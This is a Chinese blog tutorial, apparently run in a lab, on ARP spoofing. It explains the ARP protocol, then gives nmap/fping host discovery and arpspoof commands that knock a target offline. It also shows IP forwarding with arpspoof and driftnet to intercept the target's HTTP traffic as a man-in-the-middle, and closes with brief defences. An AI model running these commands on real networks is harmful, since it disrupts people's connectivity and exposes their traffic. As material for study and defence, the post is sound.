<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>局域网内的攻击—Arp欺骗 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="局域网内的攻击—Arp欺骗" />
<meta property="og:description" content="0x00:ARP协议 在局域网中，网络中实际传输的是“帧”，帧里面是有目标主机的MAC地址的。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。MAC地址就是ARP协议获得的。其实就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，危害会很隐蔽。
0x01:ARP欺骗原理 ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。
当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，由于很多时候网关还控制着我们的局域网LAN上网，所以这时我们的LAN访问也就出现问题了。
0x02:断网攻击 可以使用nmap命令寻找存活主机
nmap -sP 192.168.186.* 也可以使用fping探测一下
fping -asg 192.168.186.0/24 使用命令查看一下当前的网关
cat /etc/resolv.conf 查看当前win7的IP地址，确实是存在131的IP
在攻击前可以先看一下目标机的ARP缓存
ping一下百度的域名
可以ping通百度，说明目标主机的网络环境没有问题。
下面开始断网攻击，使用arpspoof工具，工具使用方法：
arpspoof -i 网卡 -t 目标IP 网关 如果下载了但还是没有这个arpspoof命令，就说明没有加入到环境变量中，修改一下就好了
export PATH=&#34;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin&#34; Linux修改环境变量
开启断网攻击
arpspoof -i eth0 -t 192.168.186.131 192.168.186.2 观察目标主机，已经ping不通百度
停止攻击，再次查看
说明断网攻击已经成功
0x03:ARP欺骗（不断网） ARP欺骗攻击是冒充网关向目标主机发送假的ARP数据包。
攻击流程 获取目标主机的流量获取流量之后进行转发 相当于一个中间人，可以在中途拦截一下流量，这样所有的流量都会被监控，
开启IP转发功能
cat /proc/sys/net/ipv4/ip_forward echo 1 &gt; /proc/sys/net/ipv4/ip_forward（转发） #echo 代表写入 这样可以实现流量转发，而不是截断流量 如果要截断流量，写入0即可 #截断流量 echo 0 &gt;/proc/sys/net/ipv4/ip_forward（断网） 欺骗攻击
arpspoof -i eth0 -t 192.168.186.2 192.168.186.131 #网关在前，IP在后 接下来打开另一个终端，使用一下" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/eabecf01dbb5c42adf6f7ef87d1164e1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-10-29T09:41:28+08:00" />
<meta property="article:modified_time" content="2020-10-29T09:41:28+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">局域网内的攻击—Arp欺骗</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="0x00ARP_0"></a>0x00:ARP协议</h3> 
<p>在局域网中，网络中实际传输的是“<code>帧</code>”，帧里面是有<strong>目标主机的MAC地址的</strong>。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。MAC地址就是<code>ARP协议</code>获得的。其实就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，危害会很隐蔽。</p> 
<h3><a id="0x01ARP_2"></a>0x01:ARP欺骗原理</h3> 
<p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的<code>IP-MAC</code>条目，造成网络中断或中间人攻击。</p> 
<p>当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，由于很多时候网关还控制着我们的局域网LAN上网，所以这时我们的LAN访问也就出现问题了。</p> 
<h3><a id="0x02_7"></a>0x02:断网攻击</h3> 
<p>可以使用nmap命令寻找存活主机</p> 
<pre><code class="prism language-csharp">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.186</span><span class="token punctuation">.</span><span class="token operator">*</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c0/7e/DwWoi6KA_o.png" alt="在这里插入图片描述"></p> 
<p>也可以使用fping探测一下</p> 
<pre><code class="prism language-csharp">fping <span class="token operator">-</span>asg <span class="token number">192.168</span><span class="token number">.186</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/97/2c/yHmAg2o3_o.png" alt="在这里插入图片描述"><br> 使用命令查看一下当前的网关</p> 
<pre><code class="prism language-csharp">cat <span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token punctuation">.</span>conf
</code></pre> 
<p><img src="https://images2.imgbox.com/55/8c/yhLZy2xb_o.png" alt="在这里插入图片描述"><br> 查看当前win7的IP地址，确实是存在131的IP<br> <img src="https://images2.imgbox.com/87/41/9yCLZRKh_o.png" alt="在这里插入图片描述"><br> 在攻击前可以先看一下目标机的ARP缓存<br> <img src="https://images2.imgbox.com/e2/52/cPz2QABE_o.png" alt="在这里插入图片描述"><br> ping一下百度的域名<br> <img src="https://images2.imgbox.com/b9/e2/JVJP9du3_o.png" alt="在这里插入图片描述"><br> 可以ping通百度，说明目标主机的网络环境没有问题。</p> 
<p>下面开始断网攻击，使用<code>arpspoof</code>工具，工具使用方法：</p> 
<pre><code class="prism language-csharp">arpspoof   <span class="token operator">-</span>i   网卡   <span class="token operator">-</span>t    目标IP    网关
</code></pre> 
<p>如果下载了但还是没有这个<code>arpspoof</code>命令，就说明没有加入到环境变量中，修改一下就好了</p> 
<pre><code class="prism language-csharp">export PATH<span class="token operator">=</span><span class="token string">"/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin"</span>
</code></pre> 
<p><a href="https://blog.csdn.net/qq_42137895/article/details/105250215">Linux修改环境变量</a></p> 
<p>开启断网攻击</p> 
<pre><code class="prism language-csharp">arpspoof <span class="token operator">-</span>i eth0 <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.186</span><span class="token number">.131</span> <span class="token number">192.168</span><span class="token number">.186</span><span class="token number">.2</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/fa/ec/J755QlbS_o.png" alt="在这里插入图片描述"><br> 观察目标主机，已经ping不通百度<br> <img src="https://images2.imgbox.com/f1/8c/NYJPmH9k_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/3e/83/3UXqAXkh_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/89/78/GmqqoPDS_o.png" alt="在这里插入图片描述"><br> 停止攻击，再次查看<br> <img src="https://images2.imgbox.com/1e/b5/tTh6WQ6D_o.png" alt="在这里插入图片描述"><br> 说明断网攻击已经成功</p> 
<h3><a id="0x03ARP_61"></a>0x03:ARP欺骗（不断网）</h3> 
<p>ARP欺骗攻击是冒充网关向目标主机发送假的ARP数据包。</p> 
<h5><a id="_64"></a>攻击流程</h5> 
<ol><li>获取目标主机的流量</li><li>获取流量之后进行转发</li></ol> 
<p>相当于一个中间人，可以在中途拦截一下流量，这样所有的流量都会被监控，</p> 
<p><strong>开启IP转发功能</strong></p> 
<pre><code class="prism language-csharp">cat <span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>net<span class="token operator">/</span>ipv4<span class="token operator">/</span>ip_forward
echo <span class="token number">1</span> <span class="token operator">&gt;</span> <span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>net<span class="token operator">/</span>ipv4<span class="token operator">/</span>ip_forward（转发）
<span class="token preprocessor property">#echo 代表写入</span>
这样可以实现流量转发，而不是截断流量
如果要截断流量，写入<span class="token number">0</span>即可
<span class="token preprocessor property">#截断流量</span>
echo <span class="token number">0</span> <span class="token operator">&gt;</span><span class="token operator">/</span>proc<span class="token operator">/</span>sys<span class="token operator">/</span>net<span class="token operator">/</span>ipv4<span class="token operator">/</span>ip_forward（断网）
</code></pre> 
<p>欺骗攻击</p> 
<pre><code class="prism language-csharp">arpspoof <span class="token operator">-</span>i eth0 <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.186</span><span class="token number">.2</span> <span class="token number">192.168</span><span class="token number">.186</span><span class="token number">.131</span>  
<span class="token preprocessor property">#网关在前，IP在后</span>
</code></pre> 
<p>接下来打开另一个终端，使用一下</p> 
<pre><code class="prism language-csharp">driftnet <span class="token operator">-</span>i eth0 
</code></pre> 
<p><img src="https://images2.imgbox.com/da/ef/KMPorcfR_o.png" alt="在这里插入图片描述"><br> 经过测试，只能捕捉目标主机在浏览HTTP网站的时候可以拦截流量，访问HTTPS则不行。</p> 
<p>这里稍微补充一下HTTP和HTTPS</p> 
<ol><li>HTTP是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。</li><li>HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。</li><li>HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</li><li>HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</li></ol> 
<h3><a id="0x03_102"></a>0x03:如何进行防御</h3> 
<ul><li>ARP 高速缓存超时设置</li></ul> 
<blockquote> 
 <p>在ARP高速缓存中的表项一般都要设置超时值，缩短这个这个超时值能够有用的避免ARP表的溢出。</p> 
</blockquote> 
<ul><li>静态ARP缓存表</li></ul> 
<blockquote> 
 <p>每台主机都有一个暂时寄存IP-MAC的对应表ARP攻击就经过更改这个缓存来到达诈骗的意图，运用静态的ARP来绑定正确的MAC是一个有用的办法，在命令行下运用arp -a能够检查当时的ARP缓存表。</p> 
</blockquote> 
<ul><li>自动查询</li></ul> 
<blockquote> 
 <p>在某个正常的时间，做一个IP和MAC对应的数据库，以后定时检查当时的IP和MAC对应联系是否正常，定时检查交流机的流量列表，检查丢包率。</p> 
</blockquote>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/59c6f926801f7984c8b3d6e40497a19a/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">OpenGL环境的配置（GLUT安装教程）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2fc07ae5cb1dc16dca2b14f5a3c7f8c3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Only digits (0-9) can be put inside [] in the path string: daijiaoList[${index}].number</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>